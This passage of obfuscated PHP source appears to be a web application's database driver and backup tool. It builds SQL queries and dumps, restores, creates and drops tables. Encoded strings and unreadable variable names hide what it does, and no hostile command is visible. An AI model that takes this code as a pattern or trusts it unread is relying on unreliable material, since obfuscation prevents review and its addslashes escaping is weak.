$×ÇŸÔ°[0])) { $Âäú¬Çî = is_string($×ÇŸÔ°[1]) ? explode($ê­âÀÌ[50], $×ÇŸÔ°[1]) : $×ÇŸÔ°[1]; $é†°¬Óù .= $ê­âÀÌ[956] . $©ûƒÖ±˜ . $ê­âÀÌ[53] . $this->exp[$…æŠú¿] . $ê­âÀÌ[53] . $this->parseValue($Âäú¬Çî[0]) . $ê­âÀÌ[1057] . $this->parseValue($Âäú¬Çî[1]) . $ê­âÀÌ[322]; } else { think_exception(think_lang($ê­âÀÌ[1060]) . $ê­âÀÌ[4] . $×ÇŸÔ°[0]); } } else { $Ö•ºãã = count($×ÇŸÔ°); $ğ–¾Ç‚ä = $ê­âÀÌ[12]; if (is_string($×ÇŸÔ°[$Ö•ºãã - 1])) { $ğ–¾Ç‚ä = isset($×ÇŸÔ°[$Ö•ºãã - 1]) ? strtoupper($×ÇŸÔ°[$Ö•ºãã - 1]) : $ê­âÀÌ[12]; if (in_array($ğ–¾Ç‚ä, array($ê­âÀÌ[1054], $ê­âÀÌ[1055], $ê­âÀÌ[1056]))) { $Ö•ºãã = $Ö•ºãã - 1; } } else { $ğ–¾Ç‚ä = $ê­âÀÌ[1054]; } for ($“…¬Å—Ÿ = 0; $“…¬Å—Ÿ < $Ö•ºãã; $“…¬Å—Ÿ++) { $Âäú¬Çî = is_array($×ÇŸÔ°[$“…¬Å—Ÿ]) ? $×ÇŸÔ°[$“…¬Å—Ÿ][1] : $×ÇŸÔ°[$“…¬Å—Ÿ]; if ($ê­âÀÌ[341] == strtolower($×ÇŸÔ°[$“…¬Å—Ÿ][0])) { $é†°¬Óù .= $ê­âÀÌ[304] . $©ûƒÖ±˜ . $ê­âÀÌ[53] . $Âäú¬Çî . $ê­âÀÌ[1071] . $ğ–¾Ç‚ä . $ê­âÀÌ[53]; } else { $Æ»ã®Œ† = is_array($×ÇŸÔ°[$“…¬Å—Ÿ]) ? $this->exp[strtolower($×ÇŸÔ°[$“…¬Å—Ÿ][0])] : $ê­âÀÌ[937]; if (!$Æ»ã®Œ† && is_array($×ÇŸÔ°[$“…¬Å—Ÿ]) && in_array($×ÇŸÔ°[$“…¬Å—Ÿ][0], array($ê­âÀÌ[937], $ê­âÀÌ[1064], $ê­âÀÌ[1065], $ê­âÀÌ[1066], $ê­âÀÌ[1067], $ê­âÀÌ[1068]))) { $Æ»ã®Œ† = $×ÇŸÔ°[$“…¬Å—Ÿ][0]; } $é†°¬Óù .= $ê­âÀÌ[304] . $©ûƒÖ±˜ . $ê­âÀÌ[53] . $Æ»ã®Œ† . $ê­âÀÌ[53] . $this->parseValue($Âäú¬Çî) . $ê­âÀÌ[1071] . $ğ–¾Ç‚ä . $ê­âÀÌ[53]; } } $é†°¬Óù = substr($é†°¬Óù, 0, -4); } } else { $é†°¬Óù .= $©ûƒÖ±˜ . $ê­âÀÌ[1075] . $this->parseValue($×ÇŸÔ°); } return $é†°¬Óù; } protected function parseThinkWhere($ó¢À¶™, $‚†¬èì”) { $®Œ±á· =& $_SERVER[çâ¥×ø³]; $¢§¡®è = $®Œ±á·[12]; switch ($ó¢À¶™) { case $®Œ±á·[396]: $¢§¡®è = $‚†¬èì”; break; case $®Œ±á·[1058]: $¢§¡®è = is_string($‚†¬èì”) ? $‚†¬èì” : substr($this->parseWhere($‚†¬èì”), 6); break; case $®Œ±á·[1076]: parse_str($‚†¬èì”, $Œ¤ºü§·); if (isset($Œ¤ºü§·[$®Œ±á·[1053]])) { $®Àø êö = $®Œ±á·[53] . strtoupper($Œ¤ºü§·[$®Œ±á·[1053]]) . $®Œ±á·[53]; unset($Œ¤ºü§·[$®Œ±á·[1053]]); } else { $®Àø êö = $®Œ±á·[1057]; } $ü­À¸³ú = array(); foreach ($Œ¤ºü§· as $²¦‘™˜ => $ÂÕõû) { $ü­À¸³ú[] = $this->parseKey($²¦‘™˜) . $®Œ±á·[1075] . $this->parseValue($ÂÕõû); } $¢§¡®è = implode($®Àø êö, $ü­À¸³ú); break; } return $¢§¡®è; } protected function parseLimit($Ñ‹–Üú) { $óëİ€œ =& $_SERVER[çâ¥×ø³]; return !empty($Ñ‹–Üú) ? $óëİ€œ[51] . $Ñ‹–Üú . $óëİ€œ[53] : $óëİ€œ[12]; } protected function parseJoin($·àÉ«ÓÇ) { $²ÓÇëûû =& $_SERVER[çâ¥×ø³]; $‚Ù‚ã“ = $²ÓÇëûû[12]; if (!empty($·àÉ«ÓÇ)) { if (is_array($·àÉ«ÓÇ)) { foreach ($·àÉ«ÓÇ as $èÔä°¶ => $é©¿ÔµÏ) { if (!1 !== stripos($é©¿ÔµÏ, $²ÓÇëûû[1077])) { $‚Ù‚ã“ .= $²ÓÇëûû[53] . $é©¿ÔµÏ; } else { $‚Ù‚ã“ .= $²ÓÇëûû[1078] . $é©¿ÔµÏ; } } } else { $‚Ù‚ã“ .= $²ÓÇëûû[1078] . $·àÉ«ÓÇ; } } $‚Ù‚ã“ = preg_replace($²ÓÇëûû[1079], think_config($²ÓÇëûû[983]) . $²ÓÇëûû[1080], $‚Ù‚ã“); return $‚Ù‚ã“; } protected function parseOrder($…‚‡Â·ú) { $¥Ò î« =& $_SERVER[çâ¥×ø³]; if (is_array($…‚‡Â·ú)) { $Ó¿ÜŸõ÷ = array(); foreach ($…‚‡Â·ú as $Œ£„„Ë => $£â±ÔÀá) { if (is_numeric($Œ£„„Ë)) { $Ó¿ÜŸõ÷[] = $this->parseKey($£â±ÔÀá); } else { $£â±ÔÀá = in_array(strtoupper(trim($£â±ÔÀá)), array($¥Ò î«[1081], $¥Ò î«[1082])) ? $¥Ò î«[53] . $£â±ÔÀá : $¥Ò î«[12]; if (preg_match($¥Ò î«[1083], $Œ£„„Ë)) { $Ó¿ÜŸõ÷[] = $this->parseKey($Œ£„„Ë) . $£â±ÔÀá; } else { think_exception($¥Ò î«[1084] . $Œ£„„Ë); } } } $…‚‡Â·ú = implode($¥Ò î«[50], $Ó¿ÜŸõ÷); } return !empty($…‚‡Â·ú) ? $¥Ò î«[1085] . $…‚‡Â·ú : $¥Ò î«[12]; } protected function parseGroup($ûùõ¹åç) { $è÷Ñş” =& $_SERVER[çâ¥×ø³]; return !empty($ûùõ¹åç) ? $è÷Ñş”[1086] . $ûùõ¹åç : $è÷Ñş”[12]; } protected function parseHaving($ûÆÃ­‹) { $ØúîÈØ =& $_SERVER[çâ¥×ø³]; return !empty($ûÆÃ­‹) ? $ØúîÈØ[1087] . $ûÆÃ­‹ : $ØúîÈØ[12]; } protected function parseComment($ÔÜÜœ™Ñ) { $¢¬ÇÉß =& $_SERVER[çâ¥×ø³]; return !empty($ÔÜÜœ™Ñ) ? $¢¬ÇÉß[1088] . $ÔÜÜœ™Ñ . $¢¬ÇÉß[1089] : $¢¬ÇÉß[12]; } protected function parseDistinct($‚áºŠì”) { $èòÑºîŠ =& $_SERVER[çâ¥×ø³]; return !empty($‚áºŠì”) ? $èòÑºîŠ[1090] : $èòÑºîŠ[12]; } protected function parseUnion($À½²ô˜Ğ) { $¤Œê’Å =& $_SERVER[çâ¥×ø³]; if (empty($À½²ô˜Ğ)) { return $¤Œê’Å[12]; } if (isset($À½²ô˜Ğ[$¤Œê’Å[392]])) { $îÁ§ì«Á = $¤Œê’Å[1091]; unset($À½²ô˜Ğ[$¤Œê’Å[392]]); } else { $îÁ§ì«Á = $¤Œê’Å[1092]; } foreach ($À½²ô˜Ğ as $Òä’é ù) { $·ñ¸Áùñ[] = $îÁ§ì«Á . (is_array($Òä’é ù) ? $this->buildSelectSql($Òä’é ù) : $Òä’é ù); } return implode($¤Œê’Å[53], $·ñ¸Áùñ); } public function insert($¯¬«µâ‰, $¢ÅÌÃší = array(), $€¬ú‚Ş² = false) { $‘¼‰÷œ =& $_SERVER[çâ¥×ø³]; $óóÌ‡óÆ = $‘˜ Û¬Í = array(); $this->model = $¢ÅÌÃší[$‘¼‰÷œ[325]]; foreach ($¯¬«µâ‰ as $Šö‹·¸Ç => $è—è­‡¢) { if (is_array($è—è­‡¢) && $‘¼‰÷œ[341] == $è—è­‡¢[0]) { $‘˜ Û¬Í[] = $this->parseKey($Šö‹·¸Ç); $óóÌ‡óÆ[] = $è—è­‡¢[1]; } elseif (is_scalar($è—è­‡¢) || is_null($è—è­‡¢)) { $‘˜ Û¬Í[] = $this->parseKey($Šö‹·¸Ç); $óóÌ‡óÆ[] = $this->parseValue($è—è­‡¢); } } $Ã—‰Ëøç = ($€¬ú‚Ş² ? $‘¼‰÷œ[960] : $‘¼‰÷œ[961]) . $‘¼‰÷œ[962] . $this->parseTable($¢ÅÌÃší[$‘¼‰÷œ[323]]) . $‘¼‰÷œ[956] . implode($‘¼‰÷œ[50], $‘˜ Û¬Í) . $‘¼‰÷œ[957] . implode($‘¼‰÷œ[50], $óóÌ‡óÆ) . $‘¼‰÷œ[958]; $Ã—‰Ëøç .= $this->parseLock(isset($¢ÅÌÃší[$‘¼‰÷œ[893]]) ? $¢ÅÌÃší[$‘¼‰÷œ[893]] : !1); $Ã—‰Ëøç .= $this->parseComment(!empty($¢ÅÌÃší[$‘¼‰÷œ[398]]) ? $¢ÅÌÃší[$‘¼‰÷œ[398]] : $‘¼‰÷œ[12]); return $this->execute($Ã—‰Ëøç, $this->parseBind(!empty($¢ÅÌÃší[$‘¼‰÷œ[329]]) ? $¢ÅÌÃší[$‘¼‰÷œ[329]] : array())); } public function selectInsert($ìÃûœï’, $³â–½×Ø, $¿¥ù‚ñ = array()) { $¯üÃó·– =& $_SERVER[çâ¥×ø³]; $this->model = $¿¥ù‚ñ[$¯üÃó·–[325]]; if (is_string($ìÃûœï’)) { $ìÃûœï’ = explode($¯üÃó·–[50], $ìÃûœï’); } array_walk($ìÃûœï’, array($this, $¯üÃó·–[959])); $ø°îĞò¨ = $¯üÃó·–[1093] . $this->parseTable($³â–½×Ø) . $¯üÃó·–[956] . implode($¯üÃó·–[50], $ìÃûœï’) . $¯üÃó·–[1071]; $ø°îĞò¨ .= $this->buildSelectSql($¿¥ù‚ñ); return $this->execute($ø°îĞò¨, $this->parseBind(!empty($¿¥ù‚ñ[$¯üÃó·–[329]]) ? $¿¥ù‚ñ[$¯üÃó·–[329]] : array())); } public function update($¨ßëÍ˜Î, $É‡ô³İÅ) { $Ãş”—î¿ =& $_SERVER[çâ¥×ø³]; $this->model = $É‡ô³İÅ[$Ãş”—î¿[325]]; $œ¹Ëµí = $Ãş”—î¿[1094] . $this->parseTable($É‡ô³İÅ[$Ãş”—î¿[323]]) . $this->parseSet($¨ßëÍ˜Î) . $this->parseWhere(!empty($É‡ô³İÅ[$Ãş”—î¿[319]]) ? $É‡ô³İÅ[$Ãş”—î¿[319]] : $Ãş”—î¿[12]) . $this->parseOrder(!empty($É‡ô³İÅ[$Ãş”—î¿[409]]) ? $É‡ô³İÅ[$Ãş”—î¿[409]] : $Ãş”—î¿[12]) . $this->parseLimit(!empty($É‡ô³İÅ[$Ãş”—î¿[336]]) ? $É‡ô³İÅ[$Ãş”—î¿[336]] : $Ãş”—î¿[12]) . $this->parseLock(isset($É‡ô³İÅ[$Ãş”—î¿[893]]) ? $É‡ô³İÅ[$Ãş”—î¿[893]] : !1) . $this->parseComment(!empty($É‡ô³İÅ[$Ãş”—î¿[398]]) ? $É‡ô³İÅ[$Ãş”—î¿[398]] : $Ãş”—î¿[12]); return $this->execute($œ¹Ëµí, $this->parseBind(!empty($É‡ô³İÅ[$Ãş”—î¿[329]]) ? $É‡ô³İÅ[$Ãş”—î¿[329]] : array())); } public function delete($”“Å¯Ğ– = array()) { $ «¾ìä¦ =& $_SERVER[çâ¥×ø³]; $this->model = $”“Å¯Ğ–[$ «¾ìä¦[325]]; $³ï×Î„ = $ «¾ìä¦[1095] . $this->parseTable($”“Å¯Ğ–[$ «¾ìä¦[323]]) . $this->parseWhere(!empty($”“Å¯Ğ–[$ «¾ìä¦[319]]) ? $”“Å¯Ğ–[$ «¾ìä¦[319]] : $ «¾ìä¦[12]) . $this->parseOrder(!empty($”“Å¯Ğ–[$ «¾ìä¦[409]]) ? $”“Å¯Ğ–[$ «¾ìä¦[409]] : $ «¾ìä¦[12]) . $this->parseLimit(!empty($”“Å¯Ğ–[$ «¾ìä¦[336]]) ? $”“Å¯Ğ–[$ «¾ìä¦[336]] : $ «¾ìä¦[12]) . $this->parseLock(isset($”“Å¯Ğ–[$ «¾ìä¦[893]]) ? $”“Å¯Ğ–[$ «¾ìä¦[893]] : !1) . $this->parseComment(!empty($”“Å¯Ğ–[$ «¾ìä¦[398]]) ? $”“Å¯Ğ–[$ «¾ìä¦[398]] : $ «¾ìä¦[12]); return $this->execute($³ï×Î„, $this->parseBind(!empty($”“Å¯Ğ–[$ «¾ìä¦[329]]) ? $”“Å¯Ğ–[$ «¾ìä¦[329]] : array())); } public function select($÷•£Ô÷ø = array()) { $Ïıˆ—ı =& $_SERVER[çâ¥×ø³]; $this->model = $÷•£Ô÷ø[$Ïıˆ—ı[325]]; $ˆıüàÙ‚ = $this->buildSelectSql($÷•£Ô÷ø); $àÌŠæ¦Ê = isset($÷•£Ô÷ø[$Ïıˆ—ı[393]]) ? $÷•£Ô÷ø[$Ïıˆ—ı[393]] : !1; if ($àÌŠæ¦Ê) { $ˆÌÊÑŞñ = is_string($àÌŠæ¦Ê[$Ïıˆ—ı[94]]) ? $àÌŠæ¦Ê[$Ïıˆ—ı[94]] : $Ïıˆ—ı[1096] . md5($ˆıüàÙ‚); $ ‘££şÅ = think_cache($ˆÌÊÑŞñ, $Ïıˆ—ı[12], $àÌŠæ¦Ê); if (!1 !== $ ‘££şÅ) { return $ ‘££şÅ; } } $ÁÈÑ¤ö… = $this->query($ˆıüàÙ‚, $this->parseBind(!empty($÷•£Ô÷ø[$Ïıˆ—ı[329]]) ? $÷•£Ô÷ø[$Ïıˆ—ı[329]] : array())); if ($àÌŠæ¦Ê && !1 !== $ÁÈÑ¤ö…) { think_cache($ˆÌÊÑŞñ, $ÁÈÑ¤ö…, $àÌŠæ¦Ê); } return $ÁÈÑ¤ö…; } public function buildSelectSql($Œ£Ï¢Ş = array()) { $ÚÏ•²µ =& $_SERVER[çâ¥×ø³]; if (isset($Œ£Ï¢Ş[$ÚÏ•²µ[397]])) { if (strpos($Œ£Ï¢Ş[$ÚÏ•²µ[397]], $ÚÏ•²µ[50])) { list($†²ªù£, $ƒÔ£«•ú) = explode($ÚÏ•²µ[50], $Œ£Ï¢Ş[$ÚÏ•²µ[397]]); } else { $†²ªù£ = $Œ£Ï¢Ş[$ÚÏ•²µ[397]]; } $†²ªù£ = $†²ªù£ ? $†²ªù£ : 1; $ƒÔ£«•ú = isset($ƒÔ£«•ú) ? $ƒÔ£«•ú : (is_numeric($Œ£Ï¢Ş[$ÚÏ•²µ[336]]) ? $Œ£Ï¢Ş[$ÚÏ•²µ[336]] : 20); $¢´ÜŠ‚– = $ƒÔ£«•ú * ((int) $†²ªù£ - 1); $Œ£Ï¢Ş[$ÚÏ•²µ[336]] = $¢´ÜŠ‚– . $ÚÏ•²µ[50] . $ƒÔ£«•ú; } if (think_config($ÚÏ•²µ[1097])) { $‚­–È† = $ÚÏ•²µ[1098] . md5(serialize($Œ£Ï¢Ş)); $¥¾Äú¡ı = think_cache($‚­–È†); if ($¥¾Äú¡ı) { return $¥¾Äú¡ı; } } $¢¸–ç = $this->parseSql($this->selectSql, $Œ£Ï¢Ş); $¢¸–ç .= $this->parseLock(isset($Œ£Ï¢Ş[$ÚÏ•²µ[893]]) ? $Œ£Ï¢Ş[$ÚÏ•²µ[893]] : !1); if (isset($‚­–È†)) { think_cache($‚­–È†, $¢¸–ç); } return $¢¸–ç; } public function parseSql($Î¼»÷’÷, $©¥¾İ¡ú = array()) { $ÆĞş¼´Õ =& $_SERVER[çâ¥×ø³]; $Î¼»÷’÷ = str_replace(array($ÆĞş¼´Õ[1099], $ÆĞş¼´Õ[1100], $ÆĞş¼´Õ[1101], $ÆĞş¼´Õ[1102], $ÆĞş¼´Õ[1103], $ÆĞş¼´Õ[1104], $ÆĞş¼´Õ[1105], $ÆĞş¼´Õ[1106], $ÆĞş¼´Õ[1107], $ÆĞş¼´Õ[1108], $ÆĞş¼´Õ[1109]), array($this->parseTable("{$©¥¾İ¡ú[$ÆĞş¼´Õ[323]]}"), $this->parseDistinct(isset($©¥¾İ¡ú[$ÆĞş¼´Õ[1110]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[1110]] : !1), $this->parseField(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[317]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[317]] : $ÆĞş¼´Õ[203]), $this->parseJoin(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[326]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[326]] : $ÆĞş¼´Õ[12]), $this->parseWhere(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[319]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[319]] : $ÆĞş¼´Õ[12]), $this->parseGroup(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[547]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[547]] : $ÆĞş¼´Õ[12]), $this->parseHaving(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[1111]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[1111]] : $ÆĞş¼´Õ[12]), $this->parseOrder(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[409]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[409]] : $ÆĞş¼´Õ[12]), $this->parseLimit(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[336]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[336]] : $ÆĞş¼´Õ[12]), $this->parseUnion(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[391]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[391]] : $ÆĞş¼´Õ[12]), $this->parseComment(!empty($©¥¾İ¡ú[$ÆĞş¼´Õ[398]]) ? $©¥¾İ¡ú[$ÆĞş¼´Õ[398]] : $ÆĞş¼´Õ[12])), $Î¼»÷’÷); return $Î¼»÷’÷; } public function getLastSql($šõôğ‰É = '') { return $šõôğ‰É ? $this->modelSql[$šõôğ‰É] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ñº§Ìç¢) { return addslashes($ñº§Ìç¢); } public function setModel($”•¿º) { $this->model = $”•¿º; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ö­ÌÑİ¿ = array()) { $Ó—Šà›Ú =& $_SERVER[çâ¥×ø³]; if (empty($ö­ÌÑİ¿)) { $ö­ÌÑİ¿ = $GLOBALS[$Ó—Šà›Ú[6]][$Ó—Šà›Ú[21]]; } $this->database = $ö­ÌÑİ¿; } public function model($“®ÉöŞÌ = '') { return new ModelBase($“®ÉöŞÌ, $_SERVER[çâ¥×ø³][12], $this->database); } public function db($çÏâìã• = false) { $”ºÆ¤£ =& $_SERVER[çâ¥×ø³]; $™Ë¹ª˜ = array_change_key_case($this->database); if ($this->dbType() == $”ºÆ¤£[13] || !$çÏâìã•) { return $this->model()->db(); } $¤úÉÄœ… = $™Ë¹ª˜[$”ºÆ¤£[1025]]; $™Ë¹ª˜[$”ºÆ¤£[1025]] = $”ºÆ¤£[12]; if ($™Ë¹ª˜[$”ºÆ¤£[1020]] == $”ºÆ¤£[1017]) { $…Ãé‰ = $™Ë¹ª˜[$”ºÆ¤£[1026]]; $™Ë¹ª˜[$”ºÆ¤£[1026]] = substr($…Ãé‰, 0, strrpos($…Ãé‰, $”ºÆ¤£[1112])); } $this->database = $™Ë¹ª˜; $ß±Õ”Ï‘ = $this->model()->db(); try { $Ÿ¥ÎË­… = $ß±Õ”Ï‘->execute("\163\150\x6f\x77\40\144\x61\x74\141\142\x61\163\145\163\x20\x6c\151\153\x65\40\x27{$¤úÉÄœ…}\x27"); } catch (Exception $ËÊêë¢) { } if (!$Ÿ¥ÎË­…) { $ß±Õ”Ï‘->execute("\143\162\x65\141\x74\145\x20\144\141\164\141\x62\x61\163\x65\x20\x60{$¤úÉÄœ…}\140"); } $™Ë¹ª˜[$”ºÆ¤£[1025]] = $¤úÉÄœ…; if ($™Ë¹ª˜[$”ºÆ¤£[1020]] == $”ºÆ¤£[1017]) { $™Ë¹ª˜[$”ºÆ¤£[1026]] .= $”ºÆ¤£[1112] . $¤úÉÄœ…; } $this->database = $™Ë¹ª˜; $ß±Õ”Ï‘->execute("\x75\163\145\x20\x60{$¤úÉÄœ…}\x60"); return $ß±Õ”Ï‘; } public function createTable($‹ñ™îõê, &$ÈÔ¹ÁØ€) { $àÃÁ¿Ô =& $_SERVER[çâ¥×ø³]; if (!IO::exist($‹ñ™îõê)) { ActionCall($àÃÁ¿Ô[1113], !0, 0); show_json(LNG($àÃÁ¿Ô[1114]), !1); } $ŞŒ¿ô±õ = $this->model()->db(); $ÊÉá†¡ = sqlSplit(IO::getContent($‹ñ™îõê)); foreach ($ÊÉá†¡ as $šöòìš¢) { $×Äˆşˆ = stripos($šöòìš¢, $àÃÁ¿Ô[1115]) === 0; if ($×Äˆşˆ) { $ÈÔ¹ÁØ€->task[$àÃÁ¿Ô[835]] += 1; } $ŞŒ¿ô±õ->execute($šöòìš¢); if ($×Äˆşˆ) { preg_match($àÃÁ¿Ô[1116], $šöòìš¢, $Ã–ûÉÏ©); $ÈÔ¹ÁØ€->task[$àÃÁ¿Ô[1117]] = $Ã–ûÉÏ©[1]; $ÈÔ¹ÁØ€->update(1); } } } public function insertTable($¸÷¨ÕÚ§, &$Àìûˆä) { $òÇ˜ßÓ =& $_SERVER[çâ¥×ø³]; $ßãàò±· = $this->model()->db(); $¤ÒÃûÍ = $™•×îŸå ? array($™•×îŸå) : $ßãàò±·->getTables(); foreach ($¸÷¨ÕÚ§ as $ ãù¦ó‹) { $™•×îŸå = basename($ ãù¦ó‹, $òÇ˜ßÓ[837]); if (!in_array($™•×îŸå, $¤ÒÃûÍ)) { continue; } $Àìûˆä->task[$òÇ˜ßÓ[1117]] = $™•×îŸå; if (get_filesize($ ãù¦ó‹) == 0) { continue; } $õÈàŸ¤ğ = $this->sqlToDb($ ãù¦ó‹, $Àìûˆä); if (!$õÈàŸ¤ğ) { ActionCall($òÇ˜ßÓ[1113], !0, 0); show_json(LNG($òÇ˜ßÓ[1118]) . "\x5b{$™•×îŸå}\135", !1); } } } public function sqlFromDb($İĞĞÍÜ, $ëô§ÎŠÈ, &$™Í¾¥Âæ, $¢šœÔ = '') { if ($™Í¾¥Âæ) { $™Í¾¥Âæ->task[$_SERVER[çâ¥×ø³][1117]] = $İĞĞÍÜ; } $Ğ§¹Ï = $this->model($İĞĞÍÜ); $”»íß× = 0; $…»­†ëÌ = 0; $áè›«éğ = 10000; $²Î¯®İ¯ = fopen($ëô§ÎŠÈ, $_SERVER[çâ¥×ø³][1119]); $Ãú€àµ’ = $Ğ§¹Ï->getPk(); $üÈªÌè = $Ğ§¹Ï->getDbFields(); $ò•¯ü = $_SERVER[çâ¥×ø³][12]; if ($GLOBALS[$_SERVER[çâ¥×ø³][836]] && in_array($İĞĞÍÜ, array($_SERVER[çâ¥×ø³][1120], $_SERVER[çâ¥×ø³][1121]))) { $ò•¯ü = $İĞĞÍÜ; } do { $ò™çøÊ¸ = array($Ãú€àµ’ => array($_SERVER[çâ¥×ø³][1067], $…»­†ëÌ)); $êªâ‡’ª = $Ğ§¹Ï->where($ò™çøÊ¸)->field($üÈªÌè)->order($Ãú€àµ’ . $_SERVER[çâ¥×ø³][1122])->limit($áè›«éğ)->select(); $êªâ‡’ª = !empty($êªâ‡’ª) ? $êªâ‡’ª : array(); if (!($¥Ñë“°ı = count($êªâ‡’ª))) { break; } $¼ƒÎƒµË = end($êªâ‡’ª); $…»­†ëÌ = $¼ƒÎƒµË[$Ãú€àµ’]; $³íˆœ = array(); foreach ($êªâ‡’ª as $­Â¨ÙÅø) { if ($ò•¯ü) { if ($İĞĞÍÜ == $_SERVER[çâ¥×ø³][1120]) { if ($­Â¨ÙÅø[$_SERVER[çâ¥×ø³][33]] == $_SERVER[çâ¥×ø³][1123]) { $ô–¿Š¸ú = json_decode($­Â¨ÙÅø[$_SERVER[çâ¥×ø³][418]], !0); if ($ô–¿Š¸ú[$_SERVER[çâ¥×ø³][32]] == $GLOBALS[$_SERVER[çâ¥×ø³][836]] && $ô–¿Š¸ú[$_SERVER[çâ¥×ø³][799]] != 1) { continue; } } } else { if ($­Â¨ÙÅø[$_SERVER[çâ¥×ø³][33]] == $_SERVER[çâ¥×ø³][1124] && $­Â¨ÙÅø[$_SERVER[çâ¥×ø³][94]] == $_SERVER[çâ¥×ø³][828]) { continue; } } } if ($¢šœÔ) { $­Â¨ÙÅø[$_SERVER[çâ¥×ø³][84]] = "\173\151\157\x3a{$¢šœÔ}\x7d" . substr($­Â¨ÙÅø[$_SERVER[çâ¥×ø³][84]], strlen("\x7b\151\157\72{$­Â¨ÙÅø[$_SERVER[çâ¥×ø³][866]]}\x7d")); $­Â¨ÙÅø[$_SERVER[çâ¥×ø³][866]] = $¢šœÔ; } $³íˆœ[] = $_SERVER[çâ¥×ø³][1125] . $this->sqlEncode($­Â¨ÙÅø) . $_SERVER[çâ¥×ø³][1126]; } $Àù‘»ç‹ = "\x49\x4e\x53\x45\122\124\x20\x49\x4e\x54\117\40\x60{$İĞĞÍÜ}\140\40\x28\x60" . implode($_SERVER[çâ¥×ø³][1127], $üÈªÌè) . $_SERVER[çâ¥×ø³][1128]; fwrite($²Î¯®İ¯, $Àù‘»ç‹ . implode($_SERVER[çâ¥×ø³][1129], $³íˆœ) . $_SERVER[çâ¥×ø³][71] . PHP_EOL); $”»íß× += $¥Ñë“°ı; if ($™Í¾¥Âæ) { $™Í¾¥Âæ->update($¥Ñë“°ı); } } while ($áè›«éğ == $¥Ñë“°ı); fclose($²Î¯®İ¯); return $”»íß×; } public function sqlToDb($ùæƒï, &$ã¸¼ï™º) { $·«©ç×• =& $_SERVER[çâ¥×ø³]; $ŸöìÀÈ = $this->model()->db(); $Æ¨›¸ØÉ = @fopen($ùæƒï, $·«©ç×•[1130]); if (!$Æ¨›¸ØÉ) { return !1; } $èœÎª‰ = 0; $›¦÷êù = $·«©ç×•[12]; $ø•ö“’ = array(); $ÜëŸ»‰ = $this->dbType(); $å¹ ıÓƒ = $ÜëŸ»‰ == $·«©ç×•[13] ? 500 : 2000; $øãÇÇ÷ = basename($ùæƒï, $·«©ç×•[837]); $ÎĞ·Ã¬Ó = 0; $ĞĞ¯ä×½ = 4194304 - 104858; $§Š˜Ë¼ = 1000000 - 104858; while (!feof($Æ¨›¸ØÉ)) { $ß…ô‡Ñû = trim(fgets($Æ¨›¸ØÉ)); if (!$ß…ô‡Ñû) { continue; } $†÷…¾ù = $this->sqlDecode($ß…ô‡Ñû, $ÜëŸ»‰, $øãÇÇ÷); if (stripos($†÷…¾ù, $·«©ç×•[399]) === 0) { if (!$›¦÷êù) { $›¦÷êù = $†÷…¾ù . $·«©ç×•[53]; } continue; } if ($ã¸¼ï™º) { $ã¸¼ï™º->task[$·«©ç×•[835]] += 1; } $èœÎª‰++; $ø•ö“’[] = rtrim(rtrim(trim($†÷…¾ù), $·«©ç×•[50]), $·«©ç×•[71]); $Ò—½ºåô = null; $â²¼Ş«† = strlen($†÷…¾ù); $ÎĞ·Ã¬Ó += $â²¼Ş«†; if ($ÎĞ·Ã¬Ó >= ($å¹ ıÓƒ == 500 ? $§Š˜Ë¼ : $ĞĞ¯ä×½)) { $Ò—½ºåô = array_pop($ø•ö“’); if ($èœÎª‰ > 1) { $èœÎª‰--; } } if ($èœÎª‰ >= $å¹ ıÓƒ || $Ò—½ºåô) { $†÷…¾ù = $›¦÷êù . implode($·«©ç×•[50], $ø•ö“’); if (!$ŸöìÀÈ->execute($†÷…¾ù)) { return !1; } if ($ã¸¼ï™º) { $ã¸¼ï™º->update($èœÎª‰); } $ø•ö“’ = array(); $èœÎª‰ = 0; $ÎĞ·Ã¬Ó = 0; if ($Ò—½ºåô) { $ø•ö“’ = array($Ò—½ºåô); $èœÎª‰ = 1; $ÎĞ·Ã¬Ó = $â²¼Ş«†; } } } fclose($Æ¨›¸ØÉ); if (!empty($ø•ö“’)) { $†÷…¾ù = $›¦÷êù . implode($·«©ç×•[50], $ø•ö“’); if (!$ŸöìÀÈ->execute($†÷…¾ù)) { return !1; } if ($ã¸¼ï™º) { $ã¸¼ï™º->update($èœÎª‰); } } return !0; } public function dropTable($ıÁÈÖÚ‚ = null) { $¾¾Ë“¹â = $this->model()->db(); $À×ŒÙŸ = $ıÁÈÖÚ‚ ? array($ıÁÈÖÚ‚) : $¾¾Ë“¹â->getTables(); if (!$À×ŒÙŸ) { return; } foreach ($À×ŒÙŸ as $ıÁÈÖÚ‚) { if ($ıÁÈÖÚ‚) { $ıÁÈÖÚ‚ = strtolower($ıÁÈÖÚ‚); } else { continue; } $¾¾Ë“¹â->execute("\x64\x72\157\160\x20\164\141\142\x6c\145\40\x69\x66\x20\x65\x78\151\163\x74\x73\40\x60{$ıÁÈÖÚ‚}\140"); } } private function sqlEncode($ñÛ©¾ğ) { $²¦ÀÑ±Ò =& $_SERVER[çâ¥×ø³]; $ Åññé = array(); foreach ($ñÛ©¾ğ as $«ãùƒÔ) { if (is_array($«ãùƒÔ)) { $«ãùƒÔ = json_encode_force($«ãùƒÔ); } $«ãùƒÔ = addslashes($«ãùƒÔ); $«ãùƒÔ = str_replace(array($²¦ÀÑ±Ò[1131], $²¦ÀÑ±Ò[246]), array($²¦ÀÑ±Ò[1132], 